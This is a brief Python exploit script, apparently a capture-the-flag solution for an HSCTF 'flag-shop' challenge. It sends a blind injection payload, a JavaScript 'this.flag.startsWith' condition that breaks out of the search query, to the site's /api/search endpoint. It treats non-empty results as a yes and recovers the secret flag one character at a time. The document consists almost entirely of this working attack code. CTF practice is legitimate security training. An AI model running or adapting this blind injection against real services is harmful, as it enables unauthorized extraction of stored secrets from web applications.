import string

import requests
from utils.ctf.blind_sqli import blind_sqli

URL = "http://localhost:1337"
URL = "http://flag-shop.hsctf.com"

def inject(s):
	resp = requests.post(URL + "/api/search", json={"search": s})
	return len(resp.json()["results"]) > 0

flag = blind_sqli(
	"flag-shop') && this.flag.startsWith('{0}')|| ('",
	inject,
	chars=string.ascii_lowercase + string.digits + "_{}?"
)

print(flag)
